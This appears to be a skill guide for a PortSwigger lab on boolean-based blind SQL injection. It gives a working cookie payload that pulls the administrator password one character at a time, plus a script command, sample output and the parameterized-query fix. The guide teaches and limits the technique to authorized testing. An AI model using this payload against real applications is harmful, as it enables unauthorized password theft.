# 10 - Blind SQL Injection (Boolean-Based)

## Purpose
Extract sensitive data from a database when query results are not returned directly, using a boolean-based oracle (presence/absence of content) to infer values one character at a time.

## Lab Context
**Platform**: PortSwigger Web Security Academy  
**Lab type**: Blind SQL injection with conditional responses  
**Oracle**: The response includes "Welcome back" when the injected condition is true.

This skill does **not** require discovery phase JSON files. It operates directly against a lab URL with a valid session cookie.

## How It Works

The application uses a `TrackingId` cookie in SQL queries but does not return query results in the response. Instead, it conditionally renders "Welcome back" based on whether the query returns rows.

**Injected payload pattern:**
```
TrackingId=xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{position},1)='{char}
```

For each character position (1–20) and each candidate character (a–z, 0–9):
1. Inject the payload into the `TrackingId` cookie
2. Send a GET request
3. If "Welcome back" appears → the character at that position matches
4. Move to the next position and repeat

This extracts the full password without any error messages or data echoed back.

## Setup

1. **Open the lab** in your browser
2. **Grab your session cookie** from DevTools → Application → Cookies → `session`
3. **Copy the lab URL** (e.g. `https://LABID.web-security-academy.net/`)

## Commands

```bash
python3 scripts/10_blind_sqli.py \
  --url https://LABID.web-security-academy.net/ \
  --session <your_session_value>
```

The script exits with a usage hint if the placeholder values are still set.

## Expected Output

```
[*] Target: https://LABID.web-security-academy.net/
[*] Extracting administrator password (20 chars max)...

  Position 01: s  →  s
  Position 02: e  →  se
  Position 03: c  →  sec
  ...
  Position 16: 4  →  secret1234abc5d34

[*] No match at position 17 — password extraction complete.

[+] Password: secret1234abc5d34
```

## Vulnerable vs. Safe

**Vulnerable response (condition is true):**
```
HTTP/2 200 OK
...
<div>Welcome back!</div>
```

**Safe / condition false (or patched app):**
```
HTTP/2 200 OK
...
<!-- No "Welcome back" text -->
```

A fully patched app uses parameterized queries, so the injected SQL is treated as a literal string and never evaluated — the condition can never be true.

## Safety Notes

- **Sandboxed lab only** — this technique is for PortSwigger labs and authorized engagements only
- Not for use against real targets without explicit written authorization
- The lab resets on expiry; grab a fresh session cookie if requests start failing
- No rate limiting is needed for PortSwigger labs, but add `time.sleep(0.1)` if you hit connection errors

## Execution Time

~2–5 minutes depending on password length (worst case: 20 positions × 36 chars = 720 requests).

## Next Step

After retrieving the password, log in as `administrator` via the lab's `/login` endpoint to confirm the finding and complete the lab.
